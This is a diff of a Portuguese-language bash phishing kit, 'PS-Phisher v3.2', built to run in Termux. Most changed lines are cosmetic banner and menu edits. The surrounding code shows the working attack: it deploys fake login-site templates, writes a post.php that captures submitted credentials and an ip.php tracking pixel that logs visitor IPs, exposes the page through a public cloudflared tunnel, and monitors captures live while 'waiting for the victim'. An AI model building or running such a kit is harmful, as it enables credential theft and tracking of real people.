@@ -15,58 +15,46 @@ SERVER_DIR=".server"
 CAPTURE_DIR=".server/captures"
 LOG_FILE="$SERVER_DIR/ps-phisher.log"
 
-# Cores neon / hacker
+# Cores neon / matrix
 RESET="\033[0m"
 BOLD="\033[1m"
-DIM="\033[2m"
 RED="\033[91m"
 GREEN="\033[92m"
 YELLOW="\033[93m"
-BLUE="\033[94m"
-MAGENTA="\033[95m"
 CYAN="\033[96m"
 WHITE="\033[97m"
 BG_RED="\033[101m"
-BG_GREEN="\033[102m"
 NEON_GREEN="\033[38;2;0;255;128m"
 NEON_BLUE="\033[38;2;0;255;255m"
-NEON_PURPLE="\033[38;2;255;0;255m"
-ORANGE="\033[38;2;255;165;0m"
-PEEK_COLOR="\033[38;2;255;20;147m"
+MATRIX_COLOR="\033[38;2;0;255;0m"
 
-# ----------------------------- BANNER CORRIGIDO (SEM ASCII ART QUEBRADO) -
+# ----------------------------- BANNER MATRIX ----------------------------
 banner() {
     clear
-    echo -e "${NEON_GREEN}"
-    echo "    ╔══════════════════════════════════════════════════════════╗"
-    echo "    ║  ██████  ███████ ██ ██   ██ ██ ██   ██ ███████ ██████    ║"
-    echo "    ║  ██   ██ ██      ██ ██   ██ ██ ██   ██ ██      ██   ██   ║"
-    echo "    ║  ██████  █████   ██ ███████ ██ ███████ █████   ██████    ║"
-    echo "    ║  ██      ██      ██ ██   ██ ██ ██   ██ ██      ██   ██   ║"
-    echo "    ║  ██      ███████ ██ ██   ██ ██ ██   ██ ███████ ██   ██   ║"
-    echo "    ║                                                          ║"
-    echo "    ║       ${PEEK_COLOR}PS-Phisher v3.2${NEON_GREEN}  |  ${YELLOW}PeekSecurity Team${NEON_GREEN}            ║"
-    echo "    ║   ${CYAN}Laboratório de Engenharia Social - Uso Autorizado${NEON_GREEN} ║"
-    echo "    ╚══════════════════════════════════════════════════════════╝${RESET}"
+    echo -e "${MATRIX_COLOR}"
+    echo "  [+] ========================================= [+]"
+    echo "  [+}                                          {+]"
+    echo "  [+]           PS-Phisher v3.2                [+]"
+    echo "  [+]         PeekSecurity Team                [+]"
+    echo "  [+}                                          {+]"
+    echo "  [+] ========================================= [+]${RESET}"
     echo
 }
 
 small_banner() {
     clear
-    echo -e "${NEON_BLUE}"
-    echo "    ╔════════════════════════════════════════╗"
-    echo "    ║   🧬 PS-PHISHER | PeekSecurity Mode 🧬   ║"
-    echo "    ╚════════════════════════════════════════╝${RESET}\n"
+    echo -e "${NEON_GREEN}"
+    echo "  [*] ========== PS-Phisher Mode ========== [*]${RESET}\n"
 }
 
-# ----------------------------- UTILITÁRIOS ---------------------------------
+# ----------------------------- UTILITÁRIOS -------------------------------
 log_event() { echo -e "$(date +'%H:%M:%S') - $1" >> "$LOG_FILE"; }
 die() { echo -e "\n${RED}[!] $1${RESET}"; log_event "ERRO: $1"; exit 1; }
-check_termux() { [[ ! -d /data/data/com.termux ]] && die "Termux necessário."; }
+check_termux() { [[ ! -d /data/data/com.termux ]] && die "Execute no Termux."; }
 setup_dirs() { mkdir -p "$WWW_DIR" "$CAPTURE_DIR" "$SERVER_DIR" 2>/dev/null; rm -rf "$WWW_DIR"/* 2>/dev/null; touch "$LOG_FILE"; }
 
 dependencies() {
-    echo -e "${GREEN}[+] Verificando dependências...${RESET}"
+    echo -e "${NEON_GREEN}[+] Verificando dependências...${RESET}"
     local deps=("php" "curl" "wget" "unzip" "jq")
     local missing=()
     for dep in "${deps[@]}"; do
@@ -80,12 +68,12 @@ dependencies() {
     fi
 }
 
-# ----------------------------- IP LOOKUP (próprio e externo) --------------
+# ----------------------------- IP LOOKUP (próprio e terceiros) ----------
 ip_lookup_menu() {
     small_banner
     echo -e "${CYAN}═════════════════ IP LOOKUP ═════════════════${RESET}"
-    echo -e "  ${GREEN}[1]${RESET} Consultar meu próprio IP público + Geolocalização"
-    echo -e "  ${GREEN}[2]${RESET} Consultar IP de terceiros (Geolocalização)"
+    echo -e "  ${GREEN}[1]${RESET} Meu IP público + Geolocalização"
+    echo -e "  ${GREEN}[2]${RESET} Consultar IP de terceiros"
     echo -e "  ${GREEN}[3]${RESET} Voltar ao menu principal"
     echo -ne "${YELLOW}➜ Escolha: ${RESET}"
     read -r ip_choice
@@ -94,11 +82,11 @@ ip_lookup_menu() {
             echo -e "${CYAN}[+] Obtendo seu IP público...${RESET}"
             my_ip=$(curl -s -4 ifconfig.co)
             if [[ -n "$my_ip" ]]; then
-                echo -e "${GREEN}[✓] Seu IP público: ${NEON_BLUE}$my_ip${RESET}"
+                echo -e "${NEON_GREEN}[✓] Seu IP público: ${NEON_BLUE}$my_ip${RESET}"
                 geo=$(curl -s "http://ip-api.com/json/$my_ip" | jq -r '.city, .region_name, .country' | paste -d ', ' - - -)
                 echo -e "${GREEN}[✓] Localização aproximada: ${YELLOW}$geo${RESET}"
             else
-                echo -e "${RED}[!] Falha ao obter IP. Verifique sua internet.${RESET}"
+                echo -e "${RED}[!] Falha ao obter IP. Verifique a internet.${RESET}"
             fi
             echo -e "\n${DIM}Pressione Enter para continuar...${RESET}"
             read -r
@@ -137,7 +125,7 @@ ip_lookup_menu() {
     esac
 }
 
-# ----------------------------- TÚNEIS ---------------------------------------
+# ----------------------------- TÚNEIS ------------------------------------
 install_cloudflared() {
     if [[ -x "$SERVER_DIR/cloudflared" ]]; then
         echo -e "${GREEN}[✓] Cloudflared já instalado.${RESET}"
@@ -184,7 +172,7 @@ start_localhost() {
     echo "http://$HOST:$PORT" > "$SERVER_DIR/url.txt"
 }
 
-# ----------------------------- PHP E TEMPLATES -----------------------------
+# ----------------------------- PHP E TEMPLATES ---------------------------
 start_php_server() {
     echo -e "${CYAN}[+] Iniciando servidor PHP...${RESET}"
     cd "$WWW_DIR" || die "Diretório WWW inacessível."
@@ -200,7 +188,7 @@ deploy_template() {
     [[ ! -d "$SITES_DIR/$site" ]] && die "Template '$site' não encontrado."
     echo -e "${CYAN}[+] Implantando template: $site${RESET}"
     cp -r "$SITES_DIR/$site"/* "$WWW_DIR/"
-    # ip.php com captura eficiente e pixel invisível
+    # ip.php (captura IP e retorna pixel invisível)
     cat > "$WWW_DIR/ip.php" <<'EOF'
 <?php
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -211,7 +199,7 @@ header('Content-Type: image/gif');
 echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
 ?>
 EOF
-    # post.php padrão
+    # post.php (captura credenciais)
     cat > "$WWW_DIR/post.php" <<'EOF'
 <?php
 if ($_POST) {
@@ -225,7 +213,7 @@ exit;
 EOF
 }
 
-# ----------------------------- MONITOR DE CAPTURAS AO VIVO -----------------
+# ----------------------------- MONITOR DE CAPTURAS AO VIVO --------------
 monitor_capture() {
     echo -e "${GREEN}[+] Monitorando capturas (IP e credenciais)...${RESET}"
     echo -e "${YELLOW}    Pressione Ctrl+C para interromper.${RESET}\n"
@@ -246,7 +234,7 @@ monitor_capture() {
     done
 }
 
-# ----------------------------- MENU DE TEMPLATES ESTILO HACKER ------------
+# ----------------------------- MENU DE TEMPLATES -------------------------
 list_templates() {
     local templates=()
     for d in "$SITES_DIR"/*/; do
@@ -254,18 +242,14 @@ list_templates() {
     done
     [[ ${#templates[@]} -eq 0 ]] && die "Nenhum template encontrado em $SITES_DIR"
     small_banner
-    echo -e "${CYAN}  ╔══════════════════════════════════════════════╗${RESET}"
-    echo -e "${CYAN}  ║   🎯  SELECIONE O TEMPLATE DE ATAQUE  🎯     ║${RESET}"
-    echo -e "${CYAN}  ╚══════════════════════════════════════════════╝${RESET}\n"
-    local cols=2 count=0
+    echo -e "${CYAN}═════════════ TEMPLATES DISPONÍVEIS ═════════════${RESET}"
     for i in "${!templates[@]}"; do
-        printf "${GREEN}[%2d]${RESET} %-15s" $((i+1)) "${templates[$i]}"
-        ((count++))
-        (( count % cols == 0 )) && echo
+        printf "  ${GREEN}[%2d]${RESET} %-15s" $((i+1)) "${templates[$i]}"
+        [[ $(( (i+1) % 2 )) -eq 0 ]] && echo
     done
-    (( count % cols != 0 )) && echo
+    [[ $(( ${#templates[@]} % 2 )) -ne 0 ]] && echo
     echo -e "\n  ${RED}[0]${RESET} Sair"
-    echo -e "  ${NEON_PURPLE}[99]${RESET} Menu IP Lookup"
+    echo -e "  ${NEON_GREEN}[99]${RESET} IP Lookup"
     echo -ne "\n${YELLOW}➜ Escolha: ${RESET}"
     read -r choice
     case $choice in
@@ -286,11 +270,9 @@ list_templates() {
 
 tunnel_menu() {
     small_banner
-    echo -e "${CYAN}  ╔══════════════════════════════════════════════╗${RESET}"
-    echo -e "${CYAN}  ║       🌐  MÉTODO DE EXPOSIÇÃO  🌐            ║${RESET}"
-    echo -e "${CYAN}  ╚══════════════════════════════════════════════╝${RESET}\n"
+    echo -e "${CYAN}═══════════════ MÉTODO DE EXPOSIÇÃO ═══════════════${RESET}"
     echo -e "  ${GREEN}[1]${RESET} Localhost (apenas rede local)"
-    echo -e "  ${GREEN}[2]${RESET} Cloudflared   (túnel público, recomendado)"
+    echo -e "  ${GREEN}[2]${RESET} Cloudflared   (túnel público)"
     echo -ne "\n${YELLOW}➜ Escolha: ${RESET}"
     read -r tun
     TUNNEL="localhost"
@@ -307,19 +289,19 @@ start_attack() {
     esac
     echo -e "\n${GREEN}[✓] Serviço rodando. URL(s):${RESET}"
     cat "$SERVER_DIR/url.txt" 2>/dev/null | while read url; do echo -e "    ${CYAN}$url${RESET}"; done
-    echo -e "\n${NEON_PURPLE}🔍 Aguardando interação da vítima...${RESET}\n"
+    echo -e "\n${MATRIX_COLOR}🔍 Aguardando interação da vítima...${RESET}\n"
     monitor_capture
 }
 
-# ----------------------------- MENU PRINCIPAL ------------------------------
+# ----------------------------- MENU PRINCIPAL ----------------------------
 main_menu() {
     banner
-    echo -e "${CYAN}  ╔════════════════════════════════════════════════════════╗${RESET}"
-    echo -e "${CYAN}  ║  [1] Iniciar Ataque (Phishing)                         ║${RESET}"
-    echo -e "${CYAN}  ║  [2] Consultas de IP (Próprio / Terceiros)             ║${RESET}"
-    echo -e "${CYAN}  ║  [0] Sair                                              ║${RESET}"
-    echo -e "${CYAN}  ╚════════════════════════════════════════════════════════╝${RESET}"
-    echo -ne "\n${YELLOW}➜ Escolha: ${RESET}"
+    echo -e "${CYAN}  ╔══════════════════════════════════════════╗${RESET}"
+    echo -e "${CYAN}  ║  [1] Iniciar Ataque (Phishing)           ║${RESET}"
+    echo -e "${CYAN}  ║  [2] Consultas de IP (Lookup)            ║${RESET}"
+    echo -e "${CYAN}  ║  [0] Sair                                ║${RESET}"
+    echo -e "${CYAN}  ╚══════════════════════════════════════════╝${RESET}"
+    echo -ne "${YELLOW}➜ Escolha: ${RESET}"
     read -r main_choice
     case $main_choice in
         1) list_templates ;;
@@ -329,7 +311,7 @@ main_menu() {
     esac
 }
 
-# ----------------------------- MAIN ----------------------------------------
+# ----------------------------- LIMPEZA E MAIN ----------------------------
 cleanup() {
     echo -e "\n${YELLOW}[!] Encerrando processos...${RESET}"
     pkill -f "php -S $HOST:$PORT" 2>/dev/null
